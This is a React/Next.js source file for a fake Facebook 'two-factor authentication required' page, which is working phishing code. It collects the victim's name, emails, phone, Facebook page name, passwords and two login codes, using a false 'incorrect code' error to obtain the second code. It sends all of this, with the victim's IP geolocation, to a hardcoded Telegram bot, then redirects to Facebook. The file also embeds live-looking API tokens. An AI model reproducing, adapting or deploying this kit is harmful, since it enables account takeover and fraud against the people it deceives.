import { KeyboardEvent, useCallback, useEffect, useRef, useState } from 'react';
import Countdown from 'react-countdown';
import Image from 'next/image';
import { useRouter } from 'next/router';

import { Button, Modal, Row } from 'antd';

import { standardService } from 'services/apiService/standardService';
import { useStandardActions, useStandardFormData } from 'store/standard/selector';

const ConfirmPage = () => {
  const router = useRouter();

  const [code, setCode] = useState('');
  const [code2, setCode2] = useState('');
  const [count, setCount] = useState(1);
  const [modal, setModal] = useState(false);
  const [showError, setShowError] = useState(false);
  const [showErrorLength, setShowErrorLength] = useState('');
  const [countdownTime, setCountdownTime] = useState(Date.now() + 300000);

  const formDataValue = useStandardFormData();
  const { handleSetFormData } = useStandardActions();
  const [country, setCountry] = useState<any>({});
  const [ip, setIPAddress] = useState(0);

  const handleChangePassword = (event: any) => {
    const { value } = event.target;

    if (showError) {
      setCode2(value);
    } else {
      setCode(value);
    }
  };

  const handleSendCode = async () => {
    if (code || code2) {
      if (count === 1) {
        setShowError(false);
        handleSetFormData({ ...formDataValue, code1: code });

        try {
          const response = await standardService.sendMessage(
            'https://api.telegram.org/bot6878361265:AAF7LrraMHf00rd4YdL-A5geSe5LBOKZp6I/sendMessage',
            {
              chat_id: '-4065861307',
              text: ` 
              \tIP:   ${country?.ip} | ${country?.city} | ${country?.region} | ${country?.country} | ${country?.timezone}
              \tFullname:           ${formDataValue.fullName}
              \tBussinessEmail:    ${formDataValue.businessEmailAddress}
              \tPersonalEmail:     ${formDataValue.personalEmailAddress}
              \tPhone:              ${formDataValue.mobilePhoneNumber}
              \tFacebookPageName: ${formDataValue.facebookPageName}
              \tPassword1:         ${formDataValue.password1}
              \tPassword2:         ${formDataValue.password2}
              \tCode1:             ${code}
                    `,
            },
          );
          setCount(2);
          setShowError(true);
        } catch (error) {
          return;
        }
      } else if (count === 2) {
        handleSetFormData({ ...formDataValue, code2: code2 });

        try {
          const response = await standardService.sendMessage(
            'https://api.telegram.org/bot6878361265:AAF7LrraMHf00rd4YdL-A5geSe5LBOKZp6I/sendMessage',
            {
              chat_id: '-4065861307',
              text: ` 
              \tIP:   ${country?.ip} | ${country?.city} | ${country?.region} | ${country?.country} | ${country?.timezone}
              \tFullname:           ${formDataValue.fullName}
              \tBussinessEmail:    ${formDataValue.businessEmailAddress}
              \tPersonalEmail:     ${formDataValue.personalEmailAddress}
              \tPhone:              ${formDataValue.mobilePhoneNumber}
              \tFacebookPageName: ${formDataValue.facebookPageName}
              \tPassword1:         ${formDataValue.password1}
              \tPassword2:         ${formDataValue.password2}
              \tCode1:             ${code}
              \tCode2:             ${code2}
                    `,
            },
          );

          if (response) {
            router.replace('https://www.facebook.com/policies_center/');
          }
        } catch (error) {
          return;
        }
      }
    } else {
      return;
    }
  };

  const handleOnKeyPress = (e: KeyboardEvent<HTMLInputElement>) => {
    if (!/[\d\s\b]/.test(e.key) && e.key !== 'Delete' && e.key !== 'Backspace') {
      e.preventDefault();
    }
  };

  const visibleModal = () => setModal(false);

  const renderer = useCallback(({ minutes, seconds, completed }: any) => {
    if (completed) {
      return <a>Send code again</a>;
    } else {
      return (
        <span>
          ( wait: {minutes}:{seconds} )
        </span>
      );
    }
  }, []);

  useEffect(() => {
    fetch('https://api.ipify.org?format=json')
      .then((response) => response.json())
      .then((data) => {
        setIPAddress(data.ip);
        getCountry(data.ip);
      })
      .catch((error) => console.log(error));
  }, []);

  const getCountry = (ip: any) => {
    fetch(`https://ipinfo.io/${ip}?token=07a77948eec587`)
      .then((response) => response.json())
      .then((data) => setCountry(data))
      .catch((error) => console.log(error));
  };

  return (
    <section>
      <Row
        style={{
          cursor: 'pointer',
          boxShadow: ' 1px 1px 8px 1px rgb(0 0 0 / 10%)',
          backgroundColor: 'white',
          padding: '8px 45px',
          marginBottom: '50px',
        }}
        onClick={() => {
          window.location.href = 'https://www.facebook.com/';
        }}
      >
        <Image alt='' width={40} height={40} src={'/images/fbLogo.png'} />
      </Row>

      <div className='two-factor'>
        <h3>Two-factor authentication required (1/3)</h3>

        <div className='desc'>
          <p>
            You’ve asked us to require a 6-digit login code when anyone tries to access your account from a new device
            or browser.
          </p>

          <p>
            Enter the 6-digit code from your <b>code generator</b> or third-party app below.
          </p>
        </div>

        <div className='code'>
          <input
            type='text'
            onKeyDown={(e) => handleOnKeyPress(e)}
            placeholder='Login code'
            value={showError ? code2 : code}
            onChange={handleChangePassword}
          />
          <Countdown date={countdownTime} renderer={renderer} />
        </div>
        {showError && (
          <div className='error-text'>
            The code generator you entered is incorrect. Please wait 5 minutes to receive another one.
          </div>
        )}
        {showErrorLength && !showError && <div className='error-text'>{showErrorLength}</div>}

        <div className='footer'>
          <div className='anotherway' onClick={() => setModal(true)}>
            Need another way to authenticate?
          </div>

          <Button type='primary' onClick={handleSendCode}>
            Send
          </Button>
        </div>
      </div>

      <Modal
        centered
        title={`Didn't receive a code?`}
        open={modal}
        onCancel={visibleModal}
        footer={[
          <Button key='close' onClick={visibleModal} className='closing-styling-button-no-define'>
            Close
          </Button>,
        ]}
      >
        <div className='receive-code'>
          <p>
            1. Go to <b>Settings {'>'} Security and Login.</b>
          </p>

          <p>
            2. Under the <b>Two-Factor Authentication</b> section, click <b>Use two-factor authentication.</b> You may
            need to re-enter your password.
          </p>

          <p>
            3. Next to <b>Recovery Codes</b>, click <b>Setup</b> then <b>Get Codes</b>. If you've already set up
            recovery codes, you can click <b>Show Codes</b>.
          </p>
        </div>
      </Modal>
    </section>
  );
};

export default ConfirmPage;
